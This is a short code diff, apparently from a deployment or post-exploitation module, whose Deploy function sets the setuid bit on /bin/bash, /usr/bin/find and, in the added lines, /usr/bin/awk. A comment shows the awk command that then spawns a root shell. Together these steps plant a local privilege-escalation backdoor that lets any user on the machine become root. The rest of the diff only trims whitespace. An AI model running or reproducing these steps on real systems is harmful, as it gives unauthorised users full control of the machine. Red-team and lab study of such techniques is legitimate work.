@@ -20,10 +20,10 @@ function BeforeDeploy() {
     Halt();
     return false;
   }
-  return true; 
+  return true;
 }
 
-function Deploy() {  
+function Deploy() {
   // setting /bin/bash to U+S
   ForkExecuteCommand("chmod", ["u+s", "/bin/bash"]);
   ForkExecuteCommand("chmod", ["u+x", "/bin/bash"]);
@@ -33,6 +33,12 @@ function Deploy() {
   ForkExecuteCommand("chmod", ["u+s", "/usr/bin/find"]);
   ForkExecuteCommand("chmod", ["u+x", "/usr/bin/find"]);
   LogInfo("Set /bin/zsh");
+
+  // setting awk
+  // USAGE: awk '{ system("/bin/sh") }'
+  ForkExecuteCommand("chmod", ["u+s", "/usr/bin/awk"]);
+  ForkExecuteCommand("chmod", ["u+x", "/usr/bin/awk"]);
+  LogInfo("Set /usr/bin/awk");
 
   return true;
 }
